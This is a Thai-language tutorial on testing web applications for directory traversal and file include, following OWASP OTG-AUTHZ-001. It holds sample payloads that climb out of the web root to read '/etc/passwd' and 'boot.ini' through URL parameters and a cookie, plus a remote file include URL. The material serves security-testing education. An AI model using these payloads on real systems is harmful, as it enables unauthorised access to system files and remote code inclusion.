Testing Directory traversal/file include (OTG-AUTHZ-001)

เรียกได้หลายชื่อ เช่น directory traversal, dot-dot-slash attack, directory climbing

เป็นช่องโหว่ที่ทำให้ attacker สามารถที่จะเข้าถึง file หรือ directory ไม่ว่าจะอ่านหรือเขียน ที่โดยปกติแล้วไม่มีสิทธิ์ ซึ่งอาจจะอยู่นอก web root directory หรือ นอก website

จาก owasp testing guide จะมี 2 stages หลัก คือ

Black box testing

1. Input Vectors Enumeration

tester จำเป็นที่จะต้องค้นหาแทุกๆ ส่วนที่ application รับ input จากผู้ใช้งานได้ เช่น จากตัวอย่าง จะมี

http://example.com/getUserProfile.jsp?item=ikki.html
http://example.com/index.php?file=content
http://example.com/main.cgi?home=index.htm
Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower Cookie: USER=1826cc8f:PSTYLE=GreenDotRed

2. Testing techniques

เมื่อเรา enum หาจุดที่ user สามารถกรอก input ได้มาแล้ว ก็ให้ลองพยายามอ่านไฟล์ที่น่าจะมีอยู่บนเครื่องโดย default เช่น ในตัวอย่าง ถ้าเป็น linux/unix os ก็น่าจะมีไฟล์ "/etc/passwd" หรือ ถ้าเป็น windows os ก็ควรจะมีไฟล์ "c:\boot.ini" หรือจะเป็นไฟล์ host ที่อยู่ใน "C:\Windows\System32\drivers\etc"

ทีนี้ก็ให้ลองทำการ attack ยกตัวอย่างเช่น

http://example.com/getUserProfile.jsp?item=../../../../etc/passwd

หรือ

http://example.com/getUserProfile.jsp?item=../../../../boot.ini

***โดยที่ผู้ทดสอบต้องคำนึงถึงระบบปฏิบัติการที่เป็นไปได้จากขั้นตอน info gathering หรืออื่นๆ เช่น ถ้าเห็นว่า banner ของ web server ที่หลุดมาเป็น IIS ก็เป็นไปได้ที่จะเป็น windows os เป็นต้น***

หรือลองใส่ใน cookies ยกตัวอย่างเช่น

Cookie: USER=1826cc8f:PSTYLE=../../../../etc/passwd

***สิ่งสำคัญอย่างนึงที่ต้องคำนึงถึงคือต้องศึกษารูปแบบ file หรือ directory structure ของแต่ละ operating system ว่าควรจะอยู่ในรูปแบบใด***

ในบางครั้ง เราสมารถที่จะเรียก file หรือ script ที่อยู่นอก website เป้าหมาย เช่น

http://example.com/index.php?file=http://www.owasp.org/malicious.txt
ที่กล่าวมาเป็นแค่เบื้องต้น ยังมีอีกหลายรูปแบบในการโจมตีให้ศึกษาเพิ่มเติมจาก

https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)
และในทางปฏิบัติเราสามารถใช้ Burp suite module ที่ชื่อว่า scanner ในการช่วยลดงาน manual ในส่วนนี้ของเราได้ โดยเราสามารถกำหนดจุดที่จะให้ burp ทำการค้นหาช่องโหว่ให้กับเรา จะกล่าวถึงในบทความอื่นต่อไป

Grey box testing
ใช้รูปแบบการทดสอบเหมือนกับ black box แต่กรณีที่เรามี source code ของเป้าหมาย เราสามารถที่จะค้นหา input point ได้จากการทำ source code review
